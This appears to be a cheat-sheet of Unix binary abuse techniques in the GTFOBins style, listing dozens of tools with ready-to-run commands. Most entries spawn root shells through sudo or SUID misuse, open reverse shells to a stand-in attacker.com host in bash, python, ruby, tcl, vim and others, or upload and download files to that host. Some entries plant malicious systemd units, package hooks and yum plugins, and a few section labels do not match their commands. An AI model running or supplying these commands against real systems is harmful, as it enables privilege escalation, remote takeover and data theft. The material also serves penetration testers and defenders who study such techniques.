apt.Sudo:
TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt install -c $TF sl

aria2c.Command:
sudo sh -c 'cp $(which aria2c) .; chmod +s ./aria2c'

COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
./aria2c --on-download-error=$TF http://x

base32.File read:
sudo sh -c 'cp $(which base32) .; chmod +s ./base32'

LFILE=file_to_read
base32 "$LFILE" | base32 --decode

base64.File read:
sudo sh -c 'cp $(which base64) .; chmod +s ./base64'

LFILE=file_to_read
./base64 "$LFILE" | base64 --decode

bash.Shell:
export RHOST=attacker.com
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'

bpftrace.Sudo:
sudo bpftrace -e 'BEGIN {system("/bin/sh");exit()}'

TF=$(mktemp)
echo 'BEGIN {system("/bin/sh");exit()' >$TF
sudo bpftrace $TF

sudo bpftrace -c /bin/sh -e 'END {exit()}'

cpan.Shell:
export RHOST=localhost
export RPORT=9000
cpan
! use Socket; my $i="$ENV{RHOST}"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};

dmsetup.SUID:
sudo dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
sudo dmsetup ls --exec '/bin/sh -s'

dnf.Sudo:
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF

sudo dnf install -y x-1.0-1.noarch.rpm

docker.Shell:
CONTAINER_ID="$(docker run -d alpine)" # or existing
TF=$(mktemp)
echo "DATA" > $TF
docker cp $TF $CONTAINER_ID:$TF
docker cp $CONTAINER_ID:$TF file_to_write

easy_install.Shell:
export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
easy_install $TF

ed.Shell:
ed file_to_write
a
DATA
.
w
q

gdb.Shell:
export RHOST=attacker.com
export RPORT=12345
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' -ex quit

gimp.Shell:
export RHOST=attacker.com
export RPORT=12345
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'

gtester.Shell:
sudo sh -c 'cp $(which gtester) .; chmod +s ./gtester'

TF=$(mktemp)
echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF

ip.SUID:
sudo sh -c 'cp $(which ip) .; chmod +s ./ip'

./ip netns add foo
./ip netns exec foo /bin/sh -p
./ip netns delete foo

irb.Shell:
export RHOST='127.0.0.1'
export RPORT=9000
irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read} end

ldconfig.Sudo:
sudo sh -c 'cp $(which ldconfig) .; chmod +s ./ldconfig'

TF=$(mktemp -d)
echo "$TF" > "$TF/conf"
# move malicious libraries in $TF
./ldconfig -f "$TF/conf"

lwp-download.File download:
sudo sh -c 'cp $(which lwp-download) .; chmod +s ./lwp-download'

URL=http://attacker.com/file_to_get
LFILE=file_to_save
./lwp-download $URL $LFILE

nroff.Shell:
TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
sudo GROFF_BIN_PATH=$TF nroff

pdb.Shell:
TF=$(mktemp)
echo 'import os; os.system("/bin/sh")' > $TF
sudo pdb $TF
cont

pic.Shell:
sudo pic -U
.PS
sh X sh X

pip.Shell:
export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp -d)
echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
pip install $TF

python.Shell:
export RHOST=attacker.com
export RPORT=12345
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'

restic.File upload:
sudo sh -c 'cp $(which restic) .; chmod +s ./restic'

RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
./restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"

ruby.Shell:
export RHOST=attacker.com
export RPORT=12345
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

rvim.Shell:
export RHOST=attacker.com
export RPORT=12345
rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'

systemctl.SUID:
TF=$(mktemp)
echo /bin/sh >$TF
chmod +x $TF
sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice
systemctl.Sudo:
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF

tar.Shell:
RHOST=attacker.com
RUSER=root
RFILE=/tmp/file_to_send.tar
LFILE=file_to_send
tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh

tclsh.Shell:
export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh

tcpdump.Command:
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root

tee.File write:
sudo sh -c 'cp $(which tee) .; chmod +s ./tee'

LFILE=file_to_write
echo DATA | ./tee -a "$LFILE"

top.Shell:
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
# press return twice
reset

uudecode.File read:
sudo sh -c 'cp $(which uudecode) .; chmod +s ./uudecode'

LFILE=file_to_read
uuencode "$LFILE" /dev/stdout | uudecode

uuencode.File read:
sudo sh -c 'cp $(which uuencode) .; chmod +s ./uuencode'

LFILE=file_to_read
uuencode "$LFILE" /dev/stdout | uudecode

vim.Shell:
export RHOST=attacker.com
export RPORT=12345
vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'

watch.Shell:
sudo sh -c 'cp $(which watch) .; chmod +s ./watch'

./watch -x sh -c 'reset; exec sh 1>&0 2>&0'

wish.Shell:
export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish

xz.File read:
sudo sh -c 'cp $(which xz) .; chmod +s ./xz'

LFILE=file_to_read
./xz -c "$LFILE" | xz -d

yum.Sudo:
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
sudo yum localinstall -y x-1.0-1.noarch.rpm

TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y

zypper.Sudo:
TF=$(mktemp -d)
cp /bin/sh $TF/zypper-x
sudo PATH=$TF:$PATH zypper x
